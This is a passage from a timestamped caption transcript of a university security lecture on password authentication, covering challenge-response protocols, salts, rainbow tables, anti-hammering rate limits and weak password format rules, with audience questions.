            <slice>
              <time_slice>14:30</time_slice>
              <text_slice>Because whether you send
the password or the hash</text_slice>
            </slice>
            <slice>
              <time_slice>14:32</time_slice>
              <text_slice>of a password-- I mean,
a hash of the password</text_slice>
            </slice>
            <slice>
              <time_slice>14:34</time_slice>
              <text_slice>has the same sort of semantic
power as the original password</text_slice>
            </slice>
            <slice>
              <time_slice>14:37</time_slice>
              <text_slice>itself.</text_slice>
            </slice>
            <slice>
              <time_slice>14:38</time_slice>
              <text_slice>If you haven't
authenticated the other side</text_slice>
            </slice>
            <slice>
              <time_slice>14:40</time_slice>
              <text_slice>if you haven't authenticated
the server or things like this.</text_slice>
            </slice>
            <slice>
              <time_slice>14:43</time_slice>
              <text_slice>So the basic point
with this discussion</text_slice>
            </slice>
            <slice>
              <time_slice>14:44</time_slice>
              <text_slice>here is just to stress the fact
that just adding encryption</text_slice>
            </slice>
            <slice>
              <time_slice>14:49</time_slice>
              <text_slice>or just adding hashing
doesn't necessarily</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>give you any additional powers.</text_slice>
            </slice>
            <slice>
              <time_slice>14:53</time_slice>
              <text_slice>If the client can't authenticate
who he or she is sending</text_slice>
            </slice>
            <slice>
              <time_slice>14:56</time_slice>
              <text_slice>the password to then the client
could be mistakenly divulging</text_slice>
            </slice>
            <slice>
              <time_slice>14:59</time_slice>
              <text_slice>that password with someone they
don't intend to divulged it to.</text_slice>
            </slice>
            <slice>
              <time_slice>15:03</time_slice>
              <text_slice>So perhaps a better
idea than these two</text_slice>
            </slice>
            <slice>
              <time_slice>15:07</time_slice>
              <text_slice>is to use what they call a
challenge response protocol.</text_slice>
            </slice>
            <slice>
              <time_slice>15:17</time_slice>
              <text_slice>And here's an example of a
very simple challenge response</text_slice>
            </slice>
            <slice>
              <time_slice>15:20</time_slice>
              <text_slice>protocol.</text_slice>
            </slice>
            <slice>
              <time_slice>15:21</time_slice>
              <text_slice>So let's say we've
got the client here,</text_slice>
            </slice>
            <slice>
              <time_slice>15:26</time_slice>
              <text_slice>and then you've got
the server over here.</text_slice>
            </slice>
            <slice>
              <time_slice>15:30</time_slice>
              <text_slice>So the client says,
hi, I'm Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>15:39</time_slice>
              <text_slice>And then the server response
with some challenge seam,</text_slice>
            </slice>
            <slice>
              <time_slice>15:45</time_slice>
              <text_slice>some quantity that the
server got to pick.</text_slice>
            </slice>
            <slice>
              <time_slice>15:48</time_slice>
              <text_slice>And then the client
is going to respond</text_slice>
            </slice>
            <slice>
              <time_slice>15:54</time_slice>
              <text_slice>with the hash of that
server sent challenge,</text_slice>
            </slice>
            <slice>
              <time_slice>15:58</time_slice>
              <text_slice>and then you can concatenate
that with the password.</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>So at this point, the server
can take this quantity.</text_slice>
            </slice>
            <slice>
              <time_slice>16:09</time_slice>
              <text_slice>The server knows the
challenge that it sent.</text_slice>
            </slice>
            <slice>
              <time_slice>16:11</time_slice>
              <text_slice>And presumably the server
knows the password,</text_slice>
            </slice>
            <slice>
              <time_slice>16:13</time_slice>
              <text_slice>so the server can
[INAUDIBLE] this quantity</text_slice>
            </slice>
            <slice>
              <time_slice>16:16</time_slice>
              <text_slice>and see it actually
matches what the user sent.</text_slice>
            </slice>
            <slice>
              <time_slice>16:19</time_slice>
              <text_slice>So what's nice
about this protocol</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>is that if we ignore man in the
middle attacks for a second,</text_slice>
            </slice>
            <slice>
              <time_slice>16:24</time_slice>
              <text_slice>the server is now confident
that the user's actually Alice,</text_slice>
            </slice>
            <slice>
              <time_slice>16:28</time_slice>
              <text_slice>because only Alice would
know this password here.</text_slice>
            </slice>
            <slice>
              <time_slice>16:31</time_slice>
              <text_slice>And what's nice about this is
that if the server is actually</text_slice>
            </slice>
            <slice>
              <time_slice>16:33</time_slice>
              <text_slice>the attacker-- so
in other words,</text_slice>
            </slice>
            <slice>
              <time_slice>16:36</time_slice>
              <text_slice>if Alice sent this thing
to someone who's not</text_slice>
            </slice>
            <slice>
              <time_slice>16:39</time_slice>
              <text_slice>the person who she's
trying to authenticate to,</text_slice>
            </slice>
            <slice>
              <time_slice>16:41</time_slice>
              <text_slice>then the attacker still
doesn't know the password.</text_slice>
            </slice>
            <slice>
              <time_slice>16:43</time_slice>
              <text_slice>Because the attacker
got to choose C,</text_slice>
            </slice>
            <slice>
              <time_slice>16:45</time_slice>
              <text_slice>but the attacker doesn't
know what this is.</text_slice>
            </slice>
            <slice>
              <time_slice>16:48</time_slice>
              <text_slice>And so basically
for the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>16:49</time_slice>
              <text_slice>to figure out what
the password is,</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>the attacker has to be
able to, once again,</text_slice>
            </slice>
            <slice>
              <time_slice>16:52</time_slice>
              <text_slice>invert these hash functions.</text_slice>
            </slice>
            <slice>
              <time_slice>16:54</time_slice>
              <text_slice>Do you have a question?</text_slice>
            </slice>
            <slice>
              <time_slice>16:55</time_slice>
              <text_slice>AUDIENCE: I'm just curious,
how can you not make</text_slice>
            </slice>
            <slice>
              <time_slice>16:57</time_slice>
              <text_slice>a client do the hashing?</text_slice>
            </slice>
            <slice>
              <time_slice>17:01</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>PROFESSOR: So let's see,
so your proposed scheme</text_slice>
            </slice>
            <slice>
              <time_slice>17:13</time_slice>
              <text_slice>is that the client side is
going to call this thing?</text_slice>
            </slice>
            <slice>
              <time_slice>17:20</time_slice>
              <text_slice>AUDIENCE: Yeah, so instead
of setting the password,</text_slice>
            </slice>
            <slice>
              <time_slice>17:22</time_slice>
              <text_slice>and having the server hash
the password and check it,</text_slice>
            </slice>
            <slice>
              <time_slice>17:26</time_slice>
              <text_slice>the client would just
send the hash password.</text_slice>
            </slice>
            <slice>
              <time_slice>17:28</time_slice>
              <text_slice>PROFESSOR: The client would
just sent the hash password.</text_slice>
            </slice>
            <slice>
              <time_slice>17:36</time_slice>
              <text_slice>So there's a couple reasons.</text_slice>
            </slice>
            <slice>
              <time_slice>17:37</time_slice>
              <text_slice>So one reason, as
we'll discuss later,</text_slice>
            </slice>
            <slice>
              <time_slice>17:40</time_slice>
              <text_slice>is that there's going
to be things called</text_slice>
            </slice>
            <slice>
              <time_slice>17:42</time_slice>
              <text_slice>anti-hammering defenses right.</text_slice>
            </slice>
            <slice>
              <time_slice>17:43</time_slice>
              <text_slice>Anti-hammering
defenses is designed</text_slice>
            </slice>
            <slice>
              <time_slice>17:45</time_slice>
              <text_slice>to prevent a bad client
from continually asking,</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>is this the password,
is this the password,</text_slice>
            </slice>
            <slice>
              <time_slice>17:50</time_slice>
              <text_slice>is this the password?</text_slice>
            </slice>
            <slice>
              <time_slice>17:51</time_slice>
              <text_slice>So then as a result,
it's easier for things</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>to be on the server side
as on the client side.</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>But suffice it to
say, you can, in fact,</text_slice>
            </slice>
            <slice>
              <time_slice>17:57</time_slice>
              <text_slice>do the hash on the client side.</text_slice>
            </slice>
            <slice>
              <time_slice>17:59</time_slice>
              <text_slice>Using JavaScripts or
something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>18:01</time_slice>
              <text_slice>But the basic idea
is that somehow you</text_slice>
            </slice>
            <slice>
              <time_slice>18:03</time_slice>
              <text_slice>have to have the computational
expense be very, very large,</text_slice>
            </slice>
            <slice>
              <time_slice>18:06</time_slice>
              <text_slice>because that's going to prevent
the attacker from just guessing</text_slice>
            </slice>
            <slice>
              <time_slice>18:10</time_slice>
              <text_slice>what the password is quickly.</text_slice>
            </slice>
            <slice>
              <time_slice>18:13</time_slice>
              <text_slice>Is there another question?</text_slice>
            </slice>
            <slice>
              <time_slice>18:14</time_slice>
              <text_slice>AUDIENCE: Well I just
wanted to point out</text_slice>
            </slice>
            <slice>
              <time_slice>18:16</time_slice>
              <text_slice>that if the client
does the hashing,</text_slice>
            </slice>
            <slice>
              <time_slice>18:18</time_slice>
              <text_slice>then it's [INAUDIBLE] because
your password is the hash.</text_slice>
            </slice>
            <slice>
              <time_slice>18:23</time_slice>
              <text_slice>PROFESSOR: So that's true.</text_slice>
            </slice>
            <slice>
              <time_slice>18:25</time_slice>
              <text_slice>AUDIENCE: So if
somebody get the table</text_slice>
            </slice>
            <slice>
              <time_slice>18:26</time_slice>
              <text_slice>from the server
[INAUDIBLE] using</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>it to hash they can log in.</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>PROFESSOR: That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:32</time_slice>
              <text_slice>Yeah, it gets a little
bit subtle sometimes</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
              <text_slice>depending on who can
pick, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>these challenge values.</text_slice>
            </slice>
            <slice>
              <time_slice>18:38</time_slice>
              <text_slice>Because if client and servers
can pick challenge values,</text_slice>
            </slice>
            <slice>
              <time_slice>18:40</time_slice>
              <text_slice>so that makes it more or
less difficult for the client</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>to launch those
types of attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>So for example, like one
problem with this protocol</text_slice>
            </slice>
            <slice>
              <time_slice>18:46</time_slice>
              <text_slice>here is that
basically the client</text_slice>
            </slice>
            <slice>
              <time_slice>18:49</time_slice>
              <text_slice>doesn't get to inject
any randomness into this.</text_slice>
            </slice>
            <slice>
              <time_slice>18:54</time_slice>
              <text_slice>So you can imagine
that you can make</text_slice>
            </slice>
            <slice>
              <time_slice>18:55</time_slice>
              <text_slice>this protocol more difficult
for the server to invert.</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>If the client actually got
to choose some challenge that</text_slice>
            </slice>
            <slice>
              <time_slice>19:01</time_slice>
              <text_slice>was put in here, so you got the
server side challenge verses</text_slice>
            </slice>
            <slice>
              <time_slice>19:04</time_slice>
              <text_slice>the client side challenge.</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
              <text_slice>But you're right about that.</text_slice>
            </slice>
            <slice>
              <time_slice>19:09</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>19:11</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>19:13</time_slice>
              <text_slice>So yeah, so this segues is
discussion we're just having.</text_slice>
            </slice>
            <slice>
              <time_slice>19:19</time_slice>
              <text_slice>So even though to
break this, the server</text_slice>
            </slice>
            <slice>
              <time_slice>19:22</time_slice>
              <text_slice>would have to invert
this hash, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>19:25</time_slice>
              <text_slice>could still try to do one of
these brute force attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>19:29</time_slice>
              <text_slice>So one way that we
can prevent the server</text_slice>
            </slice>
            <slice>
              <time_slice>19:30</time_slice>
              <text_slice>from doing these
brute force attacks</text_slice>
            </slice>
            <slice>
              <time_slice>19:32</time_slice>
              <text_slice>is to choose one of these
expensive hash functions</text_slice>
            </slice>
            <slice>
              <time_slice>19:33</time_slice>
              <text_slice>like we were discussing before.</text_slice>
            </slice>
            <slice>
              <time_slice>19:35</time_slice>
              <text_slice>Another thing, as
we just discussed,</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>is that you could actually
allow the client to,</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>for example, choose its
own client chosen challenge</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>over here.</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>And so that
essentially would act</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>as like a client chosen salt.
So that would essentially</text_slice>
            </slice>
            <slice>
              <time_slice>19:48</time_slice>
              <text_slice>make it more difficult
for the hacker</text_slice>
            </slice>
            <slice>
              <time_slice>19:50</time_slice>
              <text_slice>to do things like build
up a rainbow table.</text_slice>
            </slice>
            <slice>
              <time_slice>19:52</time_slice>
              <text_slice>Because note that if the
servers is the attacker here,</text_slice>
            </slice>
            <slice>
              <time_slice>19:56</time_slice>
              <text_slice>the server always can pick the
same challenge value again,</text_slice>
            </slice>
            <slice>
              <time_slice>19:59</time_slice>
              <text_slice>again, and again, allowing
to build the rainbow table.</text_slice>
            </slice>
            <slice>
              <time_slice>20:02</time_slice>
              <text_slice>But if when the
client responded back,</text_slice>
            </slice>
            <slice>
              <time_slice>20:04</time_slice>
              <text_slice>the client also
included some salt,</text_slice>
            </slice>
            <slice>
              <time_slice>20:06</time_slice>
              <text_slice>some client chosen
challenge that it included,</text_slice>
            </slice>
            <slice>
              <time_slice>20:09</time_slice>
              <text_slice>then they'll
prevent the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>20:10</time_slice>
              <text_slice>from building one of
the rainbow tables.</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>20:19</time_slice>
              <text_slice>So yeah, one thing
that I mentioned</text_slice>
            </slice>
            <slice>
              <time_slice>20:23</time_slice>
              <text_slice>that might be useful
to do is implementing</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>these anti-hammer defenses.</text_slice>
            </slice>
            <slice>
              <time_slice>20:33</time_slice>
              <text_slice>And so anti-hammering defenses
are basically designed to rate</text_slice>
            </slice>
            <slice>
              <time_slice>20:40</time_slice>
              <text_slice>limit the number
of password guesses</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>that a bad client can issue.</text_slice>
            </slice>
            <slice>
              <time_slice>20:59</time_slice>
              <text_slice>Because the idea here is that
if you've got some clients who's</text_slice>
            </slice>
            <slice>
              <time_slice>21:03</time_slice>
              <text_slice>trying to launch one
of these brute force</text_slice>
            </slice>
            <slice>
              <time_slice>21:05</time_slice>
              <text_slice>guesses against
the password, you</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>don't want that client
to be able to sit there</text_slice>
            </slice>
            <slice>
              <time_slice>21:08</time_slice>
              <text_slice>in a tight loop and just
say, is this the password,</text_slice>
            </slice>
            <slice>
              <time_slice>21:10</time_slice>
              <text_slice>is this the password,
is this the password?</text_slice>
            </slice>
            <slice>
              <time_slice>21:12</time_slice>
              <text_slice>So one way we can
do anti-hamming</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>it just do that rate limiting.</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>So the server will
say, I will only</text_slice>
            </slice>
            <slice>
              <time_slice>21:18</time_slice>
              <text_slice>accept let's say three
password guesses per second</text_slice>
            </slice>
            <slice>
              <time_slice>21:21</time_slice>
              <text_slice>from any particular client.</text_slice>
            </slice>
            <slice>
              <time_slice>21:22</time_slice>
              <text_slice>You could also mention imagine
implementing timeouts here.</text_slice>
            </slice>
            <slice>
              <time_slice>21:28</time_slice>
              <text_slice>So maybe the client can issue
a bunch of password requests</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>in a row, but then after, let's
say, 10 of them are wrong,</text_slice>
            </slice>
            <slice>
              <time_slice>21:33</time_slice>
              <text_slice>the server says, OK
you got to hold on,</text_slice>
            </slice>
            <slice>
              <time_slice>21:35</time_slice>
              <text_slice>I will not accept any more
requests from you for,</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>let's say, 10 seconds,
something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>21:42</time_slice>
              <text_slice>And so both of these
things are designed</text_slice>
            </slice>
            <slice>
              <time_slice>21:44</time_slice>
              <text_slice>for preventing
brute force attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>21:46</time_slice>
              <text_slice>And so, for example,
like some smart cars have</text_slice>
            </slice>
            <slice>
              <time_slice>21:48</time_slice>
              <text_slice>these types of
defenses, some TPNs</text_slice>
            </slice>
            <slice>
              <time_slice>21:50</time_slice>
              <text_slice>have these kinds of
defenses to basically stop</text_slice>
            </slice>
            <slice>
              <time_slice>21:53</time_slice>
              <text_slice>against this brute force attack.</text_slice>
            </slice>
            <slice>
              <time_slice>21:56</time_slice>
              <text_slice>So why is it important
for you to use</text_slice>
            </slice>
            <slice>
              <time_slice>21:58</time_slice>
              <text_slice>these anti-hammering defenses?</text_slice>
            </slice>
            <slice>
              <time_slice>21:59</time_slice>
              <text_slice>Well one reason
why it's important</text_slice>
            </slice>
            <slice>
              <time_slice>22:01</time_slice>
              <text_slice>is as we discussed
these passwords have</text_slice>
            </slice>
            <slice>
              <time_slice>22:03</time_slice>
              <text_slice>so little entropy.</text_slice>
            </slice>
            <slice>
              <time_slice>22:05</time_slice>
              <text_slice>So because passwords typically
have so little entropy,</text_slice>
            </slice>
            <slice>
              <time_slice>22:08</time_slice>
              <text_slice>it's really important
to prevent the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>22:10</time_slice>
              <text_slice>from just trying to cycle
through that low entropy space</text_slice>
            </slice>
            <slice>
              <time_slice>22:12</time_slice>
              <text_slice>very, very quickly.</text_slice>
            </slice>
            <slice>
              <time_slice>22:13</time_slice>
              <text_slice>So as you may be aware,
a lot of websites</text_slice>
            </slice>
            <slice>
              <time_slice>22:15</time_slice>
              <text_slice>have these format constraints
that push upon you</text_slice>
            </slice>
            <slice>
              <time_slice>22:21</time_slice>
              <text_slice>for your passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>They'll say things
like your password must</text_slice>
            </slice>
            <slice>
              <time_slice>22:24</time_slice>
              <text_slice>have a punctuation, it must
have a mixture of numbers</text_slice>
            </slice>
            <slice>
              <time_slice>22:31</time_slice>
              <text_slice>and letters, you must have
uppercase and lowercase stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>22:33</time_slice>
              <text_slice>so and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>22:34</time_slice>
              <text_slice>And so what those constraints
are trying to get you to do</text_slice>
            </slice>
            <slice>
              <time_slice>22:36</time_slice>
              <text_slice>is they're trying
to get you to expand</text_slice>
            </slice>
            <slice>
              <time_slice>22:38</time_slice>
              <text_slice>the entropy of the password.</text_slice>
            </slice>
            <slice>
              <time_slice>22:40</time_slice>
              <text_slice>But what's problematic though
is that it's not really</text_slice>
            </slice>
            <slice>
              <time_slice>22:43</time_slice>
              <text_slice>these formatted constraints
that we should be caring about.</text_slice>
            </slice>
            <slice>
              <time_slice>22:46</time_slice>
              <text_slice>It's the actual entropy
of the password itself.</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>So it turns out even if people
were given these constraints--</text_slice>
            </slice>
            <slice>
              <time_slice>22:51</time_slice>
              <text_slice>like you have to use
punctuation, characters,</text_slice>
            </slice>
            <slice>
              <time_slice>22:52</time_slice>
              <text_slice>and stuff like that-- the
entropy of resulting password</text_slice>
            </slice>
            <slice>
              <time_slice>22:55</time_slice>
              <text_slice>is often quite low.</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>So for example, people
will often put punctuation</text_slice>
            </slice>
            <slice>
              <time_slice>22:58</time_slice>
              <text_slice>at the beginning or end.</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>Because they don't want to
be troubled to remember like,</text_slice>
            </slice>
            <slice>
              <time_slice>23:02</time_slice>
              <text_slice>do I have like a dollar sign
in the middle or something?</text_slice>
            </slice>
            <slice>
              <time_slice>23:04</time_slice>
              <text_slice>And so as it turns out, these
format requirements oftentimes</text_slice>
            </slice>
            <slice>
              <time_slice>23:08</time_slice>
              <text_slice>don't make dictionary
attacks much harder</text_slice>
            </slice>
            <slice>
              <time_slice>23:11</time_slice>
              <text_slice>for a sophisticated adversary.</text_slice>
            </slice>
            <slice>
              <time_slice>23:14</time_slice>
              <text_slice>And the reason is because,
basically, the dictionary</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>attacker can leverage
these observations</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>about how people
pick passwords even</text_slice>
            </slice>
            <slice>
              <time_slice>23:22</time_slice>
              <text_slice>in the presence of constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>23:24</time_slice>
              <text_slice>So for example, if the attacker
knows that people typically</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>put punctuation at the
beginning or the end,</text_slice>
            </slice>
            <slice>
              <time_slice>23:28</time_slice>
              <text_slice>just incorporate that into
your dictionary attack.</text_slice>
            </slice>
            <slice>
              <time_slice>23:30</time_slice>
              <text_slice>And so an actually really
interesting website</text_slice>
            </slice>
            <slice>
              <time_slice>23:32</time_slice>
              <text_slice>you can go to that's
called Telepathwords.</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>And so what's neat
about this site</text_slice>
            </slice>
            <slice>
              <time_slice>23:41</time_slice>
              <text_slice>is that it has a
little text box.</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>So you can type a character
into that text box--</text_slice>
            </slice>
            <slice>
              <time_slice>23:46</time_slice>
              <text_slice>you're pretending that
you're entering a password--</text_slice>
            </slice>
            <slice>
              <time_slice>23:48</time_slice>
              <text_slice>and Telepathwords
will try to guess</text_slice>
            </slice>
            <slice>
              <time_slice>23:51</time_slice>
              <text_slice>what your next character is.</text_slice>
            </slice>
            <slice>
              <time_slice>23:52</time_slice>
              <text_slice>So as you type
additional characters,</text_slice>
            </slice>
            <slice>
              <time_slice>23:54</time_slice>
              <text_slice>it'll have a little drop
down box which says,</text_slice>
            </slice>
            <slice>
              <time_slice>23:56</time_slice>
              <text_slice>were you going to put this,
were you going to put this?</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>It will give you a
little blurb that says,</text_slice>
            </slice>
            <slice>
              <time_slice>24:02</time_slice>
              <text_slice>here's what I think
that you were going</text_slice>
            </slice>
            <slice>
              <time_slice>24:04</time_slice>
              <text_slice>to enter this next password.</text_slice>
            </slice>
            <slice>
              <time_slice>24:05</time_slice>
              <text_slice>So how does Telepathwords work?</text_slice>
            </slice>
            <slice>
              <time_slice>24:07</time_slice>
              <text_slice>So it basically has
a bunch of databases.</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>It has a database
of common passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>24:15</time_slice>
              <text_slice>It also has a list
of popular phrases</text_slice>
            </slice>
            <slice>
              <time_slice>24:21</time_slice>
              <text_slice>that it's taken from websites.</text_slice>
            </slice>
            <slice>
              <time_slice>24:25</time_slice>
              <text_slice>And it also has this
set of heuristics</text_slice>
            </slice>
            <slice>
              <time_slice>24:28</time_slice>
              <text_slice>which describe common user
biases in picking passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>24:36</time_slice>
              <text_slice>So for example,
one funny bias is</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>that people will
often-- when they</text_slice>
            </slice>
            <slice>
              <time_slice>24:39</time_slice>
              <text_slice>are forced with
these constraints</text_slice>
            </slice>
            <slice>
              <time_slice>24:41</time_slice>
              <text_slice>to say you must use punctuation,
stuff like that-- a lot</text_slice>
            </slice>
            <slice>
              <time_slice>24:43</time_slice>
              <text_slice>of times when they're picking
characters for the password,</text_slice>
            </slice>
            <slice>
              <time_slice>24:47</time_slice>
              <text_slice>they will use keys that
are adjacent to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>24:50</time_slice>
              <text_slice>So in other words,
they'll be very small</text_slice>
            </slice>
            <slice>
              <time_slice>24:52</time_slice>
              <text_slice>edit distance in physical
space with respect</text_slice>
            </slice>
            <slice>
              <time_slice>24:54</time_slice>
              <text_slice>to edit distance in
the actual password.</text_slice>
            </slice>
            <slice>
              <time_slice>24:56</time_slice>
              <text_slice>So what a Telepathwords does
is it has the database here,</text_slice>
            </slice>
            <slice>
              <time_slice>24:59</time_slice>
              <text_slice>so when you type in things
it's running these models.</text_slice>
            </slice>
            <slice>
              <time_slice>25:01</time_slice>
              <text_slice>And it's saying,
statistically speaking,</text_slice>
            </slice>
            <slice>
              <time_slice>25:02</time_slice>
              <text_slice>here's the most likely thing
that you're going to type next.</text_slice>
            </slice>
            <slice>
              <time_slice>25:05</time_slice>
              <text_slice>So it's almost like auto
complete for passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>25:07</time_slice>
              <text_slice>And so what's funny
is that this shows</text_slice>
            </slice>
            <slice>
              <time_slice>25:09</time_slice>
              <text_slice>once again that if you
have these constraints,</text_slice>
            </slice>
            <slice>
              <time_slice>25:11</time_slice>
              <text_slice>they actually don't protect
you that much if there are some</text_slice>
            </slice>
            <slice>
              <time_slice>25:14</time_slice>
              <text_slice>of these underlying a priori
distributions of things</text_slice>
            </slice>
            <slice>
              <time_slice>25:17</time_slice>
              <text_slice>that the attacker
can't leverage.</text_slice>
            </slice>
            <slice>
              <time_slice>25:19</time_slice>
              <text_slice>I think there was a question?</text_slice>
            </slice>
            <slice>
              <time_slice>25:21</time_slice>
              <text_slice>AUDIENCE: Yeah so it seems
like if an attacker is</text_slice>
            </slice>
            <slice>
              <time_slice>25:25</time_slice>
              <text_slice>too sophisticated
that they could</text_slice>
            </slice>
            <slice>
              <time_slice>25:28</time_slice>
              <text_slice>try guessing like a bunch
of IP addresses and things</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>which only would prevent
hammering [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>25:42</time_slice>
              <text_slice>PROFESSOR: Yeah,
it's very tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>25:44</time_slice>
              <text_slice>Now that's a good point.</text_slice>
            </slice>
            <slice>
              <time_slice>25:45</time_slice>
              <text_slice>So anti-hammering
basically sounds well</text_slice>
            </slice>
            <slice>
              <time_slice>25:47</time_slice>
              <text_slice>what's the scope of the attack
that you're trying to prevent?</text_slice>
            </slice>
            <slice>
              <time_slice>25:50</time_slice>
              <text_slice>So if you're concerned
about distributed attackers</text_slice>
            </slice>
            <slice>
              <time_slice>25:54</time_slice>
              <text_slice>and a network system, it does
become very, very subtle.</text_slice>
            </slice>
            <slice>
              <time_slice>25:57</time_slice>
              <text_slice>And suffice it to say that
the notion of anti-hammering</text_slice>
            </slice>
            <slice>
              <time_slice>26:00</time_slice>
              <text_slice>or [INAUDIBLE] systems, and
also the notion of things</text_slice>
            </slice>
            <slice>
              <time_slice>26:02</time_slice>
              <text_slice>like clipfraud, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>26:05</time_slice>
              <text_slice>So in other words,
how does someone</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>who's running an
advertising campaign online</text_slice>
            </slice>
            <slice>
              <time_slice>26:08</time_slice>
              <text_slice>determine if someone's
actually putting the link</text_slice>
            </slice>
            <slice>
              <time_slice>26:10</time_slice>
              <text_slice>and actually paying someone
for those clicks, verses</text_slice>
            </slice>
            <slice>
              <time_slice>26:13</time_slice>
              <text_slice>this is just spammer who
got some box just sitting</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>there clicking on stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>26:17</time_slice>
              <text_slice>So suffice it to say
there's a lot of distributed</text_slice>
            </slice>
            <slice>
              <time_slice>26:19</time_slice>
              <text_slice>heuristics that try to
solve those problems.</text_slice>
            </slice>
            <slice>
              <time_slice>26:21</time_slice>
              <text_slice>And in many cases, it's
not a science, it's an art.</text_slice>
            </slice>
            <slice>
              <time_slice>26:23</time_slice>
              <text_slice>But your [INAUDIBLE] correct
and in the distributed setting,</text_slice>
            </slice>
            <slice>
              <time_slice>26:26</time_slice>
              <text_slice>things get much more
difficult. All right,</text_slice>
            </slice>
            <slice>
              <time_slice>26:30</time_slice>
              <text_slice>so does this all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>26:32</time_slice>
              <text_slice>AUDIENCE: What about the
cryptographic anti-hammering</text_slice>
            </slice>
            <slice>
              <time_slice>26:35</time_slice>
              <text_slice>defenses?</text_slice>
            </slice>
            <slice>
              <time_slice>26:36</time_slice>
              <text_slice>Most of the time you end up
sending a hash on the line</text_slice>
            </slice>
            <slice>
              <time_slice>26:40</time_slice>
              <text_slice>[INAUDIBLE] that when
you get out of it</text_slice>
            </slice>
            <slice>
              <time_slice>26:44</time_slice>
              <text_slice>is exactly what
you would get out</text_slice>
            </slice>
            <slice>
              <time_slice>26:46</time_slice>
              <text_slice>the password of the
hashable password?</text_slice>
            </slice>
            <slice>
              <time_slice>26:50</time_slice>
              <text_slice>I know there are
protocols like SRP</text_slice>
            </slice>
            <slice>
              <time_slice>26:52</time_slice>
              <text_slice>or there are some zero
knowledge protocols.</text_slice>
            </slice>
